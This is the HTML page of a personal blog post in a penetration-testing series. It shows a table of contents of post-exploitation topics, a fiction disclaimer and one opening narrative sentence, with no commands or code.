<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="light"
  data-auto-appearance="false"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>Part 7 Advanced Network Penetration Testing Post Exploitation &middot; Val&#39;s blog</title>
  <meta name="title" content="Part 7 Advanced Network Penetration Testing Post Exploitation &middot; Val&#39;s blog" />
  
  <meta name="description" content="My awesome website" />
  <meta name="keywords" content="Networking, Love, Yapping-Journaling, " />
  
  
  <link rel="canonical" href="http://localhost:1313/posts/part-7-advanced-network-penetration-testing-post-exploitation/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.00dd8b9350ecc82ac2af1f4674a9aad6c9a42e761652b3143d532e4b352bd5ca4750a9e040a76fd03e5d53ef1eb025fa8d60f7c673632f7ca0683ece7f990542.css"
    integrity="sha512-AN2Lk1DsyCrCrx9GdKmq1smkLnYWUrMUPVMuSzUr1cpHUKngQKdv0D5dU&#43;8esCX6jWD3xnNjL3ygaD7Of5kFQg==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.b36dda9ec4ec11e967fd341e7d57b8c484ac7a39f8f329f7bcf7ce4812569de8607db866a086d4789956ac0b74967e251c9a566d94d469dd28b8787fed4f46f5.js"
    integrity="sha512-s23ansTsEeln/TQefVe4xISsejn48yn3vPfOSBJWnehgfbhmoIbUeJlWrAt0ln4lHJpWbZTUad0ouHh/7U9G9Q==" data-copy="" data-copied=""></script>
  
  
  <script src="/js/zoom.min.js"></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  <meta property="og:url" content="http://localhost:1313/posts/part-7-advanced-network-penetration-testing-post-exploitation/">
  <meta property="og:site_name" content="Val&#39;s blog">
  <meta property="og:title" content="Part 7 Advanced Network Penetration Testing Post Exploitation">
  <meta property="og:description" content="Disclaimer : This blog post is a work of fiction.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-07-19T07:17:09+00:00">
    <meta property="article:modified_time" content="2024-07-19T07:17:09+00:00">
    <meta property="article:tag" content="Networking">
    <meta property="article:tag" content="Love">
    <meta property="article:tag" content="Yapping-Journaling">
    <meta property="og:image" content="http://localhost:1313/posts/part-7-advanced-network-penetration-testing-post-exploitation/featured.jpg">
      <meta property="og:see_also" content="http://localhost:1313/posts/part-6-all-on-networking-penetration-baby/">
      <meta property="og:see_also" content="http://localhost:1313/posts/part-5-understanding-reverse-and-binding-shell/">
      <meta property="og:see_also" content="http://localhost:1313/posts/part-4-performing-vulnerability-assessments/">
      <meta property="og:see_also" content="http://localhost:1313/posts/part-3-exploring-active-reconnaissance-techniques/">
      <meta property="og:see_also" content="http://localhost:1313/posts/part-2-reconnaissance-and-footprint/">
      <meta property="og:see_also" content="http://localhost:1313/posts/part-1-buidling-a-penetration-testing-labs/">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/part-7-advanced-network-penetration-testing-post-exploitation/featured.jpg">
  <meta name="twitter:title" content="Part 7 Advanced Network Penetration Testing Post Exploitation">
  <meta name="twitter:description" content="Disclaimer : This blog post is a work of fiction.">

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Blog",
    "name": "Part 7 Advanced Network Penetration Testing Post Exploitation",
    "headline": "Part 7 Advanced Network Penetration Testing Post Exploitation",
    
    "abstract": "Disclaimer : This blog post is a work of fiction.",
    "inLanguage": "en",
    "url" : "http:\/\/localhost:1313\/posts\/part-7-advanced-network-penetration-testing-post-exploitation\/",
    "author" : {
      "@type": "Person",
      "name": "Valentin"
    },
    "copyrightYear": "2024",
    "dateCreated": "2024-07-19T07:17:09\u002b00:00",
    "datePublished": "2024-07-19T07:17:09\u002b00:00",
    
    "dateModified": "2024-07-19T07:17:09\u002b00:00",
    
    "keywords": ["Networking","Love","Yapping-Journaling"],
    
    "mainEntityOfPage": "true",
    "wordCount": "2946"
  }]
  </script>


  
  
  <meta name="author" content="Valentin" />
  
  
  
  <link href="https://github.com/LiLTrash1" rel="me" />
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>





















  
  

  
  
  <meta name="theme-color"/>
  
  
</head>
<body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
    
    
    
    <div>
        <a href="/" class="flex">
            <span class="sr-only">Val&rsquo;s blog</span>

            <img src="/img/big-cat.webp" width="14" height="15"
                class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="Val&#39;s blog" />

        </a>
    </div>
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Val&rsquo;s blog</a>
            

        </nav>
        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">

            
            
            
  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Blog
    </p>
</a>


            
            
  <a href="/series/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Series
    </p>
</a>


            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class="ltr:mr-14 rtl:ml-14 flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 -mr-2 md:hidden">

        <label id="menu-button" for="menu-controller" class="block">
            <input type="checkbox" id="menu-controller" class="hidden" />
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li>
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Blog
        </p>
    </a>
</li>



                    

                    
  <li class="mt-1">
    <a href="/series/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Series
        </p>
    </a>
</li>



                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>





  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  
  
  
  
  
  
        
            <div class="w-full h-36 md:h-56 lg:h-72 single_hero_basic nozoom" style="background-image:url(/posts/part-7-advanced-network-penetration-testing-post-exploitation/featured_hu742ba9a971be6d263b5d7e465784d792_80135_1200x0_resize_q75_box.jpg);"></div>
        
    
  
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      Part 7 Advanced Network Penetration Testing Post Exploitation
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      





  
  







  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-07-19 07:17:09 &#43;0000 UTC">19 Jul, 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">14 mins</span>
  

  
  
</div>





<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/walkthrough/&#34;,'_self');">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Walkthrough
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/networking/&#34;,'_self');">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Networking
  </span>
</span>
  </span>
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/love/&#34;,'_self');">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Love
  </span>
</span>
  </span>
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/yapping-journaling/&#34;,'_self');">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Yapping-Journaling
  </span>
</span>
  </span>
  
  
  
  
</div>



    </div>

    
    
    
    
    

    
      
      
<div class="flex author">
  
    
    
      
        
      
      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
      alt="Valentin" src="/img/lain-bear-icon_hu287918b86cd01e5c30abf2d8e152735f_11882_192x192_fill_q75_box_center.jpg" />
    
  
  <div class="place-self-center">
    
    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
      Author
    </div>
    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
      Valentin
    </div>
    
    
    <div class="text-sm text-neutral-700 dark:text-neutral-400">Focusing on mastering penetration testing and digital forensics</div>
    
    <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/LiLTrash1"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>

</span></a
        >
      
    
  </div>

</div>
  </div>
</div>
    

    

    

    
    <div class="mb-5"></div>
    
  
  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
     <div
      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">

         <details open class="toc-right mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#1-post-exploitation-using-meterpreter">1. Post-exploitation using Meterpreter</a>
      <ul>
        <li><a href="#11-useful-meterpreter-commands">1.1 Useful Meterpreter Commands</a></li>
        <li><a href="#12-uploading-and-downloading-files">1.2 Uploading and downloading files</a></li>
      </ul>
    </li>
    <li><a href="#2-privilege-escalation-in-meterpreter">2. Privilege Escalation In Meterpreter</a>
      <ul>
        <li><a href="#21-token-stealing-and-impersonation">2.1 Token Stealing and Impersonation</a></li>
      </ul>
    </li>
    <li><a href="#3-implementing-persistence">3. Implementing Persistence</a>
      <ul>
        <li><a href="#31-creating-persistence-through-account-creation-backdoor">3.1 Creating Persistence through Account Creation Backdoor</a></li>
        <li><a href="#32-registry-persistence-creation">3.2 Registry Persistence Creation</a></li>
        <li><a href="#33-lateral-movement-and-pivoting">3.3 Lateral Movement and Pivoting</a></li>
        <li><a href="#34-clearing-tracks-after-penetration-test">3.4 Clearing Tracks after Penetration Test</a></li>
      </ul>
    </li>
    <li><a href="#4-data-encoding-and-exfiltration">4. Data Encoding and Exfiltration</a>
      <ul>
        <li><a href="#41-encoding-executable-with-exe2hex">4.1 Encoding Executable with exe2hex</a></li>
      </ul>
    </li>
    <li><a href="#5-data-exfiltration-using-packetwhisper">5. Data Exfiltration using PacketWhisper</a>
      <ul>
        <li><a href="#51-setting-up-the-environment">5.1 Setting up the environment</a></li>
        <li><a href="#52-changing-the-dns-setting-on-the-compromised-host">5.2 Changing the DNS setting on the compromised host</a></li>
        <li><a href="#53-performing-data-exfiltration">5.3 Performing Data Exfiltration</a></li>
      </ul>
    </li>
    <li><a href="#6-understanding-mitm-and-packet-sniffing-attacks">6. Understanding MITM and packet sniffing attacks</a>
      <ul>
        <li><a href="#61-using-ettercap-to-perform-a-mitm-attack">6.1 Using Ettercap to perform a MITM attack</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#1-post-exploitation-using-meterpreter">1. Post-exploitation using Meterpreter</a>
      <ul>
        <li><a href="#11-useful-meterpreter-commands">1.1 Useful Meterpreter Commands</a></li>
        <li><a href="#12-uploading-and-downloading-files">1.2 Uploading and downloading files</a></li>
      </ul>
    </li>
    <li><a href="#2-privilege-escalation-in-meterpreter">2. Privilege Escalation In Meterpreter</a>
      <ul>
        <li><a href="#21-token-stealing-and-impersonation">2.1 Token Stealing and Impersonation</a></li>
      </ul>
    </li>
    <li><a href="#3-implementing-persistence">3. Implementing Persistence</a>
      <ul>
        <li><a href="#31-creating-persistence-through-account-creation-backdoor">3.1 Creating Persistence through Account Creation Backdoor</a></li>
        <li><a href="#32-registry-persistence-creation">3.2 Registry Persistence Creation</a></li>
        <li><a href="#33-lateral-movement-and-pivoting">3.3 Lateral Movement and Pivoting</a></li>
        <li><a href="#34-clearing-tracks-after-penetration-test">3.4 Clearing Tracks after Penetration Test</a></li>
      </ul>
    </li>
    <li><a href="#4-data-encoding-and-exfiltration">4. Data Encoding and Exfiltration</a>
      <ul>
        <li><a href="#41-encoding-executable-with-exe2hex">4.1 Encoding Executable with exe2hex</a></li>
      </ul>
    </li>
    <li><a href="#5-data-exfiltration-using-packetwhisper">5. Data Exfiltration using PacketWhisper</a>
      <ul>
        <li><a href="#51-setting-up-the-environment">5.1 Setting up the environment</a></li>
        <li><a href="#52-changing-the-dns-setting-on-the-compromised-host">5.2 Changing the DNS setting on the compromised host</a></li>
        <li><a href="#53-performing-data-exfiltration">5.3 Performing Data Exfiltration</a></li>
      </ul>
    </li>
    <li><a href="#6-understanding-mitm-and-packet-sniffing-attacks">6. Understanding MITM and packet sniffing attacks</a>
      <ul>
        <li><a href="#61-using-ettercap-to-perform-a-mitm-attack">6.1 Using Ettercap to perform a MITM attack</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
  </div>
</details>

   </div>
      </div>
      


      <div class="min-w-0 min-h-0 max-w-fit">
        
        
<details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5" >
    <summary
        class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
        Ultimate-Kali-Linux-Book - This article is part of a series.
    </summary>
    
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="http://localhost:1313/posts/part-1-buidling-a-penetration-testing-labs/">
            Part 1: Part 1 Building a Penetesting Lab
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="http://localhost:1313/posts/part-2-reconnaissance-and-footprint/">
            Part 2: Part 2 Reconnaissance and Footprint
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="http://localhost:1313/posts/part-3-exploring-active-reconnaissance-techniques/">
            Part 3: Part 3 Exploring Active Reconnaissance Techniques
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="http://localhost:1313/posts/part-4-performing-vulnerability-assessments/">
            Part 4: Part 4 Performing Vulnerability Assessments
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="http://localhost:1313/posts/part-5-understanding-reverse-and-binding-shell/">
            Part 5: Part 5 Understanding Reverse and Binding Shell
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="http://localhost:1313/posts/part-6-all-on-networking-penetration-baby/">
            Part 6: Part 6 All on Networking Penetration Baby
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        Part 7: This Article
    </div>
    
    

</details>



        <div class="article-content max-w-prose mb-20">
          <iframe style="border-radius:12px" src="https://open.spotify.com/embed/track/7FJrIeLwz1qQsgFyYzNW7Q?utm_source=generator" width="100%" height="152" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
<p><strong>Disclaimer</strong> <em>: This blog post is a work of fiction. Names, characters, businesses, places, events, and incidents are either the products of the author&rsquo;s imagination or used in a fictitious manner. Any resemblance to actual persons, living or dead, or actual events is purely coincidental.</em></p>
<p>Driving back from the encounter, the White Rabbit arrives home with confusion as to what just happened at work. Grabbing his trusty red foldable bike from the stairs he decides to head off into town as the sun was setting down to let his mind wonder a bit before sleep.</p>
